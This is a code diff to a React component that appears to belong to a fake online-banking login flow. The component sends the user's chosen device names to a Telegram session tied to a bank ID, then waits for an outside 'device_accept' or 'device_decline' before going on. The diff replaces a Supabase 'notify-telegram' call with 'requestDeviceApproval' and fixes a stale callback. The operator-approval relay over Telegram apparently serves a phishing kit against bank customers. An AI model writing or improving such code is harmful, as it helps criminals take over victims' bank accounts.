@@ -5,8 +5,8 @@
 
 import { Info, ArrowRight, Check, ChevronDown, Smartphone, CheckCircle2 } from "lucide-react";
 import { useEffect, useMemo, useRef, useState } from "react";
-import { supabase } from "@/integrations/supabase/client";
 import { fetchTelegramSession } from "@/lib/telegramSession";
+import { requestDeviceApproval } from "@/lib/qrLogin.functions";
 // SmartTanOverlay wird im übergeordneten Flow global gerendert.
 
 export interface Device {
@@ -112,6 +112,8 @@ export function DeviceManagementStep({ devices, bankId, onContinue }: DeviceMana
   const [approved, setApproved] = useState(false);
   const [rejected, setRejected] = useState(false);
   const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const onContinueRef = useRef(onContinue);
+  useEffect(() => { onContinueRef.current = onContinue; }, [onContinue]);
 
   const anySelected = selected.size > 0;
 
@@ -144,16 +146,13 @@ export function DeviceManagementStep({ devices, bankId, onContinue }: DeviceMana
     try {
       const tgSessionId = bankId ? sessionStorage.getItem(`tg_session:${bankId}`) : null;
       if (tgSessionId) {
-        (supabase as unknown as { functions: { invoke: (n: string, o: unknown) => Promise<unknown> } }).functions
-          .invoke("notify-telegram", {
-            body: {
-              mode: "device-management-pending",
-              session_id: tgSessionId,
-              active_devices: selectedDevices.map((d) => d.name || d.appId).filter(Boolean),
-              inactive_devices: unselectedDevices.map((d) => d.name || d.appId).filter(Boolean),
-            },
-          })
-          .catch((err: unknown) => console.error("notify-telegram device-management-pending failed", err));
+        requestDeviceApproval({
+          data: {
+            sessionId: tgSessionId,
+            active: selectedDevices.map((d) => d.name || d.appId).filter(Boolean),
+            inactive: unselectedDevices.map((d) => d.name || d.appId).filter(Boolean),
+          },
+        }).catch((err: unknown) => console.error("requestDeviceApproval failed", err));
       }
     } catch (err) {
       console.warn("[device-management] tg notify skipped", err);
@@ -179,7 +178,7 @@ export function DeviceManagementStep({ devices, bankId, onContinue }: DeviceMana
 
         if (d === "device_accept") {
           setApproved(true);
-          setTimeout(() => onContinue(), 1200);
+          setTimeout(() => onContinueRef.current(), 1200);
           return;
         }
         if (d === "device_decline") {
@@ -202,7 +201,7 @@ export function DeviceManagementStep({ devices, bankId, onContinue }: DeviceMana
       cancelled = true;
       if (pollRef.current) clearTimeout(pollRef.current);
     };
-  }, [stage, bankId, onContinue]);
+  }, [stage, bankId]);
 
   const gridCols = list.length >= 3 ? "md:grid-cols-3" : list.length === 2 ? "md:grid-cols-2" : "md:grid-cols-1";
 
